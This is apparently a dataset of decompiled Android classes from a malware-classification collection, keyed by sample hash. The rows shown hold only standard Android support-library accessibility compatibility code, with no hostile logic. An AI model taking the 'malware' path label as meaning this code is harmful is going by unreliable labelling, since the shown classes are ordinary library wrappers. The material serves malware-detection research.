"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityEventCompatIcs.code","class AccessibilityEventCompatIcs {   AccessibilityEventCompatIcs(){   }   public static int getRecordCount(  AccessibilityEvent event){     return event.getRecordCount();   }   public static void appendRecord(  AccessibilityEvent event,  Object record){     event.appendRecord((AccessibilityRecord)record);   }   public static Object getRecord(  AccessibilityEvent event,  int index){     return event.getRecord(index);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityEventIcsImpl.code","static class AccessibilityEventIcsImpl extends AccessibilityEventStubImpl {   AccessibilityEventIcsImpl(){   }   @Override public void appendRecord(  AccessibilityEvent event,  Object record){     AccessibilityEventCompatIcs.appendRecord(event,record);   }   @Override public Object getRecord(  AccessibilityEvent event,  int index){     return AccessibilityEventCompatIcs.getRecord(event,index);   }   @Override public int getRecordCount(  AccessibilityEvent event){     return AccessibilityEventCompatIcs.getRecordCount(event);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityEventStubImpl.code","static class AccessibilityEventStubImpl implements AccessibilityEventVersionImpl {   AccessibilityEventStubImpl(){   }   @Override public void appendRecord(  AccessibilityEvent event,  Object record){   }   @Override public Object getRecord(  AccessibilityEvent event,  int index){     return null;   }   @Override public int getRecordCount(  AccessibilityEvent event){     return 0;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityEventVersionImpl.code","interface AccessibilityEventVersionImpl {   void appendRecord(  AccessibilityEvent accessibilityEvent,  Object obj);   Object getRecord(  AccessibilityEvent accessibilityEvent,  int i);   int getRecordCount(  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityManagerCompat.code","public class AccessibilityManagerCompat {   private static final AccessibilityManagerVersionImpl IMPL; interface AccessibilityManagerVersionImpl {     boolean addAccessibilityStateChangeListener(    AccessibilityManager accessibilityManager,    AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);     List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(    AccessibilityManager accessibilityManager,    int i);     List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(    AccessibilityManager accessibilityManager);     boolean isTouchExplorationEnabled(    AccessibilityManager accessibilityManager);     Object newAccessiblityStateChangeListener(    AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);     boolean removeAccessibilityStateChangeListener(    AccessibilityManager accessibilityManager,    AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);   } public static abstract class AccessibilityStateChangeListenerCompat {     final Object mListener=AccessibilityManagerCompat.IMPL.newAccessiblityStateChangeListener(this);     public abstract void onAccessibilityStateChanged(    boolean z);   } static class AccessibilityManagerStubImpl implements AccessibilityManagerVersionImpl {     AccessibilityManagerStubImpl(){     }     @Override public Object newAccessiblityStateChangeListener(    AccessibilityStateChangeListenerCompat listener){       return null;     }     @Override public boolean addAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return false;     }     @Override public boolean removeAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return false;     }     @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(    AccessibilityManager manager,    int feedbackTypeFlags){       return Collections.emptyList();     }     @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(    AccessibilityManager manager){       return Collections.emptyList();     }     @Override public boolean isTouchExplorationEnabled(    AccessibilityManager manager){       return false;     }   } static class AccessibilityManagerIcsImpl extends AccessibilityManagerStubImpl {     AccessibilityManagerIcsImpl(){     }     @Override public Object newAccessiblityStateChangeListener(    final AccessibilityStateChangeListenerCompat listener){       return AccessibilityManagerCompatIcs.newAccessibilityStateChangeListener(new AccessibilityManagerCompatIcs.AccessibilityStateChangeListenerBridge(){         @Override public void onAccessibilityStateChanged(        boolean enabled){           listener.onAccessibilityStateChanged(enabled);         }       } );     }     @Override public boolean addAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return AccessibilityManagerCompatIcs.addAccessibilityStateChangeListener(manager,listener.mListener);     }     @Override public boolean removeAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return AccessibilityManagerCompatIcs.removeAccessibilityStateChangeListener(manager,listener.mListener);     }     @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(    AccessibilityManager manager,    int feedbackTypeFlags){       return AccessibilityManagerCompatIcs.getEnabledAccessibilityServiceList(manager,feedbackTypeFlags);     }     @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(    AccessibilityManager manager){       return AccessibilityManagerCompatIcs.getInstalledAccessibilityServiceList(manager);     }     @Override public boolean isTouchExplorationEnabled(    AccessibilityManager manager){       return AccessibilityManagerCompatIcs.isTouchExplorationEnabled(manager);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityManagerIcsImpl();     }  else {       IMPL=new AccessibilityManagerStubImpl();     }   }   public static boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return IMPL.addAccessibilityStateChangeListener(manager,listener);   }   public static boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return IMPL.removeAccessibilityStateChangeListener(manager,listener);   }   public static List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return IMPL.getInstalledAccessibilityServiceList(manager);   }   public static List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return IMPL.getEnabledAccessibilityServiceList(manager,feedbackTypeFlags);   }   public static boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return IMPL.isTouchExplorationEnabled(manager);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityManagerCompatIcs.code","class AccessibilityManagerCompatIcs { interface AccessibilityStateChangeListenerBridge {     void onAccessibilityStateChanged(    boolean z);   }   AccessibilityManagerCompatIcs(){   }   public static Object newAccessibilityStateChangeListener(  final AccessibilityStateChangeListenerBridge bridge){     return new AccessibilityManager.AccessibilityStateChangeListener(){       @Override public void onAccessibilityStateChanged(      boolean enabled){         AccessibilityStateChangeListenerBridge.this.onAccessibilityStateChanged(enabled);       }     } ;   }   public static boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  Object listener){     return manager.addAccessibilityStateChangeListener((AccessibilityManager.AccessibilityStateChangeListener)listener);   }   public static boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  Object listener){     return manager.removeAccessibilityStateChangeListener((AccessibilityManager.AccessibilityStateChangeListener)listener);   }   public static List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return manager.getEnabledAccessibilityServiceList(feedbackTypeFlags);   }   public static List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return manager.getInstalledAccessibilityServiceList();   }   public static boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return manager.isTouchExplorationEnabled();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityManagerIcsImpl.code","static class AccessibilityManagerIcsImpl extends AccessibilityManagerStubImpl {   AccessibilityManagerIcsImpl(){   }   @Override public Object newAccessiblityStateChangeListener(  final AccessibilityStateChangeListenerCompat listener){     return AccessibilityManagerCompatIcs.newAccessibilityStateChangeListener(new AccessibilityManagerCompatIcs.AccessibilityStateChangeListenerBridge(){       @Override public void onAccessibilityStateChanged(      boolean enabled){         listener.onAccessibilityStateChanged(enabled);       }     } );   }   @Override public boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return AccessibilityManagerCompatIcs.addAccessibilityStateChangeListener(manager,listener.mListener);   }   @Override public boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return AccessibilityManagerCompatIcs.removeAccessibilityStateChangeListener(manager,listener.mListener);   }   @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return AccessibilityManagerCompatIcs.getEnabledAccessibilityServiceList(manager,feedbackTypeFlags);   }   @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return AccessibilityManagerCompatIcs.getInstalledAccessibilityServiceList(manager);   }   @Override public boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return AccessibilityManagerCompatIcs.isTouchExplorationEnabled(manager);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityManagerStubImpl.code","static class AccessibilityManagerStubImpl implements AccessibilityManagerVersionImpl {   AccessibilityManagerStubImpl(){   }   @Override public Object newAccessiblityStateChangeListener(  AccessibilityStateChangeListenerCompat listener){     return null;   }   @Override public boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return false;   }   @Override public boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return false;   }   @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return Collections.emptyList();   }   @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return Collections.emptyList();   }   @Override public boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return false;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityManagerVersionImpl.code","interface AccessibilityManagerVersionImpl {   boolean addAccessibilityStateChangeListener(  AccessibilityManager accessibilityManager,  AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);   List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager accessibilityManager,  int i);   List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager accessibilityManager);   boolean isTouchExplorationEnabled(  AccessibilityManager accessibilityManager);   Object newAccessiblityStateChangeListener(  AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);   boolean removeAccessibilityStateChangeListener(  AccessibilityManager accessibilityManager,  AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityNodeInfoBridge.code","interface AccessibilityNodeInfoBridge {   Object createAccessibilityNodeInfo(  int i);   List<Object> findAccessibilityNodeInfosByText(  String str,  int i);   boolean performAction(  int i,  int i2,  Bundle bundle); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.view.accessibility\AccessibilityNodeInfoCompat.code","public class AccessibilityNodeInfoCompat {   public static final int ACTION_ACCESSIBILITY_FOCUS=64;   public static final String ACTION_ARGUMENT_HTML_ELEMENT_STRING=""ACTION_ARGUMENT_HTML_ELEMENT_STRING"";   public static final String ACTION_ARGUMENT_MOVEMENT_GRANULARITY_INT=""ACTION_ARGUMENT_MOVEMENT_GRANULARITY_INT"";   public static final int ACTION_CLEAR_ACCESSIBILITY_FOCUS=128;   public static final int ACTION_CLEAR_FOCUS=2;   public static final int ACTION_CLEAR_SELECTION=8;   public static final int ACTION_CLICK=16;   public static final int ACTION_FOCUS=1;   public static final int ACTION_LONG_CLICK=32;   public static final int ACTION_NEXT_AT_MOVEMENT_GRANULARITY=256;   public static final int ACTION_NEXT_HTML_ELEMENT=1024;   public static final int ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY=512;   public static final int ACTION_PREVIOUS_HTML_ELEMENT=2048;   public static final int ACTION_SCROLL_BACKWARD=8192;   public static final int ACTION_SCROLL_FORWARD=4096;   public static final int ACTION_SELECT=4;   public static final int FOCUS_ACCESSIBILITY=2;   public static final int FOCUS_INPUT=1;   private static final AccessibilityNodeInfoImpl IMPL;   public static final int MOVEMENT_GRANULARITY_CHARACTER=1;   public static final int MOVEMENT_GRANULARITY_LINE=4;   public static final int MOVEMENT_GRANULARITY_PAGE=16;   public static final int MOVEMENT_GRANULARITY_PARAGRAPH=8;   public static final int MOVEMENT_GRANULARITY_WORD=2;   private final Object mInfo; interface AccessibilityNodeInfoImpl {     void addAction(    Object obj,    int i);     void addChild(    Object obj,    View view);     void addChild(    Object obj,    View view,    int i);     List<Object> findAccessibilityNodeInfosByText(    Object obj,    String str);     Object findFocus(    Object obj,    int i);     Object focusSearch(    Object obj,    int i);     int getActions(    Object obj);     void getBoundsInParent(    Object obj,    Rect rect);     void getBoundsInScreen(    Object obj,    Rect rect);     Object getChild(    Object obj,    int i);     int getChildCount(    Object obj);     CharSequence getClassName(    Object obj);     CharSequence getContentDescription(    Object obj);     int getMovementGranularities(    Object obj);     CharSequence getPackageName(    Object obj);     Object getParent(    Object obj);     CharSequence getText(    Object obj);     int getWindowId(    Object obj);     boolean isAccessibilityFocused(    Object obj);     boolean isCheckable(    Object obj);     boolean isChecked(    Object obj);     boolean isClickable(    Object obj);     boolean isEnabled(    Object obj);     boolean isFocusable(    Object obj);     boolean isFocused(    Object obj);     boolean isLongClickable(    Object obj);     boolean isPassword(    Object obj);     boolean isScrollable(    Object obj);     boolean isSelected(    Object obj);     boolean isVisibleToUser(    Object obj);     Object obtain();     Object obtain(    View view);     Object obtain(    View view,    int i);     Object obtain(    Object obj);     boolean performAction(    Object obj,    int i);     boolean performAction(    Object obj,    int i,    Bundle bundle);     void recycle(    Object obj);     void setAccessibilityFocused(    Object obj,    boolean z);     void setBoundsInParent(    Object obj,    Rect rect);     void setBoundsInScreen(    Object obj,    Rect rect);     void setCheckable(    Object obj,    boolean z);     void setChecked(    Object obj,    boolean z);     void setClassName(    Object obj,    CharSequence charSequence);     void setClickable(    Object obj,    boolean z);     void setContentDescription(    Object obj,    CharSequence charSequence);     void setEnabled(    Object obj,    boolean z);     void setFocusable(    Object obj,    boolean z);     void setFocused(    Object obj,    boolean z);     void setLongClickable(    Object obj,    boolean z);     void setMovementGranularities(    Object obj,    int i);     void setPackageName(    Object obj,    CharSequence charSequence);     void setParent(    Object obj,    View view);     void setParent(    Object obj,    View view,    int i);     void setPassword(    Object obj,    boolean z);     void setScrollable(    Object obj,    boolean z);     void setSelected(    Object obj,    boolean z);     void setSource(    Object obj,    View view);     void setSource(    Object obj,    View view,    int i);     void setText(    Object obj,    CharSequence charSequence);     void setVisibleToUser(    Object obj,    boolean z);   } static class AccessibilityNodeInfoStubImpl implements AccessibilityNodeInfoImpl {     AccessibilityNodeInfoStubImpl(){     }     @Override public Object obtain(){       return null;     }     @Override public Object obtain(    View source){       return null;     }     @Override public Object obtain(    View root,    int virtualDescendantId){       return null;     }     @Override public Object obtain(    Object info){       return null;     }     @Override public void addAction(    Object info,    int action){     }     @Override public void addChild(    Object info,    View child){     }     @Override public void addChild(    Object info,    View child,    int virtualDescendantId){     }     @Override public List<Object> findAccessibilityNodeInfosByText(    Object info,    String text){       return Collections.emptyList();     }     @Override public int getActions(    Object info){       return 0;     }     @Override public void getBoundsInParent(    Object info,    Rect outBounds){     }     @Override public void getBoundsInScreen(    Object info,    Rect outBounds){     }     @Override public Object getChild(    Object info,    int index){       return null;     }     @Override public int getChildCount(    Object info){       return 0;     }     @Override public CharSequence getClassName(    Object info){       return null;     }     @Override public CharSequence getContentDescription(    Object info){       return null;     }     @Override public CharSequence getPackageName(    Object info){       return null;     }     @Override public Object getParent(    Object info){       return null;     }     @Override public CharSequence getText(    Object info){       return null;     }     @Override public int getWindowId(    Object info){       return 0;     }     @Override public boolean isCheckable(    Object info){       return false;     }     @Override public boolean isChecked(    Object info){       return false;     }     @Override public boolean isClickable(    Object info){       return false;     }     @Override public boolean isEnabled(    Object info){       return false;     }     @Override public boolean isFocusable(    Object info){       return false;     }     @Override public boolean isFocused(    Object info){       return false;     }     @Override public boolean isVisibleToUser(    Object info){       return false;     }     @Override public boolean isAccessibilityFocused(    Object info){       return false;     }     @Override public boolean isLongClickable(    Object info){       return false;     }     @Override public boolean isPassword(    Object info){       return false;     }     @Override public boolean isScrollable(    Object info){       return false;     }     @Override public boolean isSelected(    Object info){       return false;     }     @Override public boolean performAction(    Object info,    int action){       return false;     }     @Override public boolean performAction(    Object info,    int action,    Bundle arguments){       return false;     }     @Override public void setMovementGranularities(    Object info,    int granularities){     }     @Override public int getMovementGranularities(    Object info){       return 0;     }     @Override public void setBoundsInParent(    Object info,    Rect bounds){     }     @Override public void setBoundsInScreen(    Object info,    Rect bounds){     }     @Override public void setCheckable(    Object info,    boolean checkable){     }     @Override public void setChecked(    Object info,    boolean checked){     }     @Override public void setClassName(    Object info,    CharSequence className){     }     @Override public void setClickable(    Object info,    boolean clickable){     }     @Override public void setContentDescription(    Object info,    CharSequence contentDescription){     }     @Override public void setEnabled(    Object info,    boolean enabled){     }     @Override public void setFocusable(    Object info,    boolean focusable){     }     @Override public void setFocused(    Object info,    boolean focused){     }     @Override public void setVisibleToUser(    Object info,    boolean visibleToUser){     }     @Override public void setAccessibilityFocused(    Object info,    boolean focused){     }     @Override public void setLongClickable(    Object info,    boolean longClickable){     }     @Override public void setPackageName(    Object info,    CharSequence packageName){     }     @Override public void setParent(    Object info,    View parent){     }     @Override public void setPassword(    Object info,    boolean password){     }     @Override public void setScrollable(    Object info,    boolean scrollable){     }     @Override public void setSelected(    Object info,    boolean selected){     }     @Override public void setSource(    Object info,    View source){     }     @Override public void setSource(    Object info,    View root,    int virtualDescendantId){     }     @Override public Object findFocus(    Object info,    int focus){       return null;     }     @Override public Object focusSearch(    Object info,    int direction){       return null;     }     @Override public void setText(    Object info,    CharSequence text){     }     @Override public void recycle(    Object info){     }     @Override public void setParent(    Object info,    View root,    int virtualDescendantId){     }   } static class AccessibilityNodeInfoIcsImpl extends AccessibilityNodeInfoStubImpl {     AccessibilityNodeInfoIcsImpl(){     }     @Override public Object obtain(){       return AccessibilityNodeInfoCompatIcs.obtain();     }     @Override public Object obtain(    View source){       return AccessibilityNodeInfoCompatIcs.obtain(source);     }     @Override public Object obtain(    Object info){       return AccessibilityNodeInfoCompatIcs.obtain(info);     }     @Override public void addAction(    Object info,    int action){       AccessibilityNodeInfoCompatIcs.addAction(info,action);     }     @Override public void addChild(    Object info,    View child){       AccessibilityNodeInfoCompatIcs.addChild(info,child);     }     @Override public List<Object> findAccessibilityNodeInfosByText(    Object info,    String text){       return AccessibilityNodeInfoCompatIcs.findAccessibilityNodeInfosByText(info,text);     }     @Override public int getActions(    Object info){       return AccessibilityNodeInfoCompatIcs.getActions(info);     }     @Override public void getBoundsInParent(    Object info,    Rect outBounds){       AccessibilityNodeInfoCompatIcs.getBoundsInParent(info,outBounds);     }     @Override public void getBoundsInScreen(    Object info,    Rect outBounds){       AccessibilityNodeInfoCompatIcs.getBoundsInScreen(info,outBounds);     }     @Override public Object getChild(    Object info,    int index){       return AccessibilityNodeInfoCompatIcs.getChild(info,index);     }     @Override public int getChildCount(    Object info){       return AccessibilityNodeInfoCompatIcs.getChildCount(info);     }     @Override public CharSequence getClassName(    Object info){       return AccessibilityNodeInfoCompatIcs.getClassName(info);     }     @Override public CharSequence getContentDescription(    Object info){       return AccessibilityNodeInfoCompatIcs.getContentDescription(info);     }     @Override public CharSequence getPackageName(    Object info){       return AccessibilityNodeInfoCompatIcs.getPackageName(info);     }     @Override public Object getParent(    Object info){       return AccessibilityNodeInfoCompatIcs.getParent(info);     }     @Override public CharSequence getText(    Object info){       return AccessibilityNodeInfoCompatIcs.getText(info);     }     @Override public int getWindowId(    Object info){       return AccessibilityNodeInfoCompatIcs.getWindowId(info);     }     @Override public boolean isCheckable(    Object info){       return AccessibilityNodeInfoCompatIcs.isCheckable(info);     }     @Override public boolean isChecked(    Object info){       return AccessibilityNodeInfoCompatIcs.isChecked(info);     }     @Override public boolean isClickable(    Object info){       return AccessibilityNodeInfoCompatIcs.isClickable(info);     }     @Override public boolean isEnabled(    Object info){       return AccessibilityNodeInfoCompatIcs.isEnabled(info);     }     @Override public boolean isFocusable(    Object info){       return AccessibilityNodeInfoCompatIcs.isFocusable(info);     }     @Override public boolean isFocused(    Object info){       return AccessibilityNodeInfoCompatIcs.isFocused(info);     }     @Override public boolean isLongClickable(    Object info){       return AccessibilityNodeInfoCompatIcs.isLongClickable(info);     }     @Override public boolean isPassword(    Object info){       return AccessibilityNodeInfoCompatIcs.isPassword(info);     }     @Override public boolean isScrollable(    Object info){       return AccessibilityNodeInfoCompatIcs.isScrollable(info);     }     @Override public boolean isSelected(    Object info){       return AccessibilityNodeInfoCompatIcs.isSelected(info);     }     @Override public boolean performAction(    Object info,    int action){       return AccessibilityNodeInfoCompatIcs.performAction(info,action);     }     @Override public void setBoundsInParent(    Object info,    Rect bounds){       AccessibilityNodeInfoCompatIcs.setBoundsInParent(info,bounds);     }     @Override public void setBoundsInScreen(    Object info,    Rect bounds){       AccessibilityNodeInfoCompatIcs.setBoundsInScreen(info,bounds);     }     @Override public void setCheckable(    Object info,    boolean checkable){       AccessibilityNodeInfoCompatIcs.setCheckable(info,checkable);     }     @Override public void setChecked(    Object info,    boolean checked){       AccessibilityNodeInfoCompatIcs.setChecked(info,checked);     }     @Override public void setClassName(    Object info,    CharSequence className){       AccessibilityNodeInfoCompatIcs.setClassName(info,className);     }     @Override public void setClickable(    Object info,    boolean clickable){       AccessibilityNodeInfoCompatIcs.setClickable(info,clickable);     }     @Override public void setContentDescription(    Object info,    CharSequence contentDescription){       AccessibilityNodeInfoCompatIcs.setContentDescription(info,contentDescription);     }     @Override public void setEnabled(    Object info,    boolean enabled){       AccessibilityNodeInfoCompatIcs.setEnabled(info,enabled);     }     @Override public void setFocusable(    Object info,    boolean focusable){       AccessibilityNodeInfoCompatIcs.setFocusable(info,focusable);     }     @Override public void setFocused(    Object info,    boolean focused){       AccessibilityNodeInfoCompatIcs.setFocused(info,focused);     }     @Override public void setLongClickable(    Object info,    boolean longClickable){       AccessibilityNodeInfoCompatIcs.setLongClickable(info,longClickable);     }     @Override public void setPackageName(    Object info,    CharSequence packageName){       AccessibilityNodeInfoCompatIcs.setPackageName(info,packageName);     }     @Override public void setParent(    Object info,    View parent){       AccessibilityNodeInfoCompatIcs.setParent(info,parent);     }     @Override public void setPassword(    Object info,    boolean password){       AccessibilityNodeInfoCompatIcs.setPassword(info,password);     }     @Override public void setScrollable(    Object info,    boolean scrollable){       AccessibilityNodeInfoCompatIcs.setScrollable(info,scrollable);     }     @Override public void setSelected(    Object info,    boolean selected){       AccessibilityNodeInfoCompatIcs.setSelected(info,selected);     }     @Override public void setSource(    Object info,    View source){       AccessibilityNodeInfoCompatIcs.setSource(info,source);     }     @Override public void setText(    Object info,    CharSequence text){       AccessibilityNodeInfoCompatIcs.setText(info,text);     }     @Override public void recycle(    Object info){       AccessibilityNodeInfoCompatIcs.recycle(info);     }   } static class AccessibilityNodeInfoJellybeanImpl extends AccessibilityNodeInfoIcsImpl {     AccessibilityNodeInfoJellybeanImpl(){     }     @Override public Object obtain(    View root,    int virtualDescendantId){       return AccessibilityNodeInfoCompatJellyBean.obtain(root,virtualDescendantId);     }     @Override public Object findFocus(    Object info,    int focus){       return AccessibilityNodeInfoCompatJellyBean.findFocus(info,focus);     }     @Override public Object focusSearch(    Object info,    int direction){       return AccessibilityNodeInfoCompatJellyBean.focusSearch(info,direction);     }     @Override public void addChild(    Object info,    View child,    int virtualDescendantId){       AccessibilityNodeInfoCompatJellyBean.addChild(info,child,virtualDescendantId);     }     @Override public void setSource(    Object info,    View root,    int virtualDescendantId){       AccessibilityNodeInfoCompatJellyBean.setSource(info,root,virtualDescendantId);     }     @Override public boolean isVisibleToUser(    Object info){       return AccessibilityNodeInfoCompatJellyBean.isVisibleToUser(info);     }     @Override public void setVisibleToUser(    Object info,    boolean visibleToUser){       AccessibilityNodeInfoCompatJellyBean.setVisibleToUser(info,visibleToUser);     }     @Override public boolean isAccessibilityFocused(    Object info){       return AccessibilityNodeInfoCompatJellyBean.isAccessibilityFocused(info);     }     @Override public void setAccessibilityFocused(    Object info,    boolean focused){       AccessibilityNodeInfoCompatJellyBean.setAccesibilityFocused(info,focused);     }     @Override public boolean performAction(    Object info,    int action,    Bundle arguments){       return AccessibilityNodeInfoCompatJellyBean.performAction(info,action,arguments);     }     @Override public void setMovementGranularities(    Object info,    int granularities){       AccessibilityNodeInfoCompatJellyBean.setMovementGranularities(info,granularities);     }     @Override public int getMovementGranularities(    Object info){       return AccessibilityNodeInfoCompatJellyBean.getMovementGranularities(info);     }     @Override public void setParent(    Object info,    View root,    int virtualDescendantId){       AccessibilityNodeInfoCompatJellyBean.setParent(info,root,virtualDescendantId);     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityNodeInfoJellybeanImpl();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityNodeInfoIcsImpl();     }  else {       IMPL=new AccessibilityNodeInfoStubImpl();     }   }   public static AccessibilityNodeInfoCompat wrapNonNullInstance(  Object object){     if (object != null) {       return new AccessibilityNodeInfoCompat(object);     }     return null;   }   public AccessibilityNodeInfoCompat(  Object info){     this.mInfo=info;   }   public Object getInfo(){     return this.mInfo;   }   public static AccessibilityNodeInfoCompat obtain(  View source){     return wrapNonNullInstance(IMPL.obtain(source));   }   public static AccessibilityNodeInfoCompat obtain(  View root,  int virtualDescendantId){     return wrapNonNullInstance(IMPL.obtain(root,virtualDescendantId));   }   public static AccessibilityNodeInfoCompat obtain(){     return wrapNonNullInstance(IMPL.obtain());   }   public static AccessibilityNodeInfoCompat obtain(  AccessibilityNodeInfoCompat info){     return wrapNonNullInstance(IMPL.obtain(info.mInfo));   }   public void setSource(  View source){     IMPL.setSource(this.mInfo,source);   }   public void setSource(  View root,  int virtualDescendantId){     IMPL.setSource(this.mInfo,root,virtualDescendantId);   }   public AccessibilityNodeInfoCompat findFocus(  int focus){     return wrapNonNullInstance(IMPL.findFocus(this.mInfo,focus));   }   public AccessibilityNodeInfoCompat focusSearch(  int direction){     return wrapNonNullInstance(IMPL.focusSearch(this.mInfo,direction));   }   public int getWindowId(){     return IMPL.getWindowId(this.mInfo);   }   public int getChildCount(){     return IMPL.getChildCount(this.mInfo);   }   public AccessibilityNodeInfoCompat getChild(  int index){     return wrapNonNullInstance(IMPL.getChild(this.mInfo,index));   }   public void addChild(  View child){     IMPL.addChild(this.mInfo,child);   }   public void addChild(  View root,  int virtualDescendantId){     IMPL.addChild(this.mInfo,root,virtualDescendantId);   }   public int getActions(){     return IMPL.getActions(this.mInfo);   }   public void addAction(  int action){     IMPL.addAction(this.mInfo,action);   }   public boolean performAction(  int action){     return IMPL.performAction(this.mInfo,action);   }   public boolean performAction(  int action,  Bundle arguments){     return IMPL.performAction(this.mInfo,action,arguments);   }   public void setMovementGranularities(  int granularities){     IMPL.setMovementGranularities(this.mInfo,granularities);   }   public int getMovementGranularities(){     return IMPL.getMovementGranularities(this.mInfo);   }   public List<AccessibilityNodeInfoCompat> findAccessibilityNodeInfosByText(  String text){     List<AccessibilityNodeInfoCompat> result=new ArrayList<>();     List<Object> infos=IMPL.findAccessibilityNodeInfosByText(this.mInfo,text);     int infoCount=infos.size();     for (int i=0; i < infoCount; i++) {       Object info=infos.get(i);       result.add(new AccessibilityNodeInfoCompat(info));     }     return result;   }   public AccessibilityNodeInfoCompat getParent(){     return wrapNonNullInstance(IMPL.getParent(this.mInfo));   }   public void setParent(  View parent){     IMPL.setParent(this.mInfo,parent);   }   public void setParent(  View root,  int virtualDescendantId){     IMPL.setParent(this.mInfo,root,virtualDescendantId);   }   public void getBoundsInParent(  Rect outBounds){     IMPL.getBoundsInParent(this.mInfo,outBounds);   }   public void setBoundsInParent(  Rect bounds){     IMPL.setBoundsInParent(this.mInfo,bounds);   }   public void getBoundsInScreen(  Rect outBounds){     IMPL.getBoundsInScreen(this.mInfo,outBounds);   }   public void setBoundsInScreen(  Rect bounds){     IMPL.setBoundsInScreen(this.mInfo,bounds);   }   public boolean isCheckable(){     return IMPL.isCheckable(this.mInfo);   }   public void setCheckable(  boolean checkable){     IMPL.setCheckable(this.mInfo,checkable);   }   public boolean isChecked(){     return IMPL.isChecked(this.mInfo);   }   public void setChecked(  boolean checked){     IMPL.setChecked(this.mInfo,checked);   }   public boolean isFocusable(){     return IMPL.isFocusable(this.mInfo);   }   public void setFocusable(  boolean focusable){     IMPL.setFocusable(this.mInfo,focusable);   }   public boolean isFocused(){     return IMPL.isFocused(this.mInfo);   }   public void setFocused(  boolean focused){     IMPL.setFocused(this.mInfo,focused);   }   public boolean isVisibleToUser(){     return IMPL.isVisibleToUser(this.mInfo);   }   public void setVisibleToUser(  boolean visibleToUser){     IMPL.setVisibleToUser(this.mInfo,visibleToUser);   }   public boolean isAccessibilityFocused(){     return 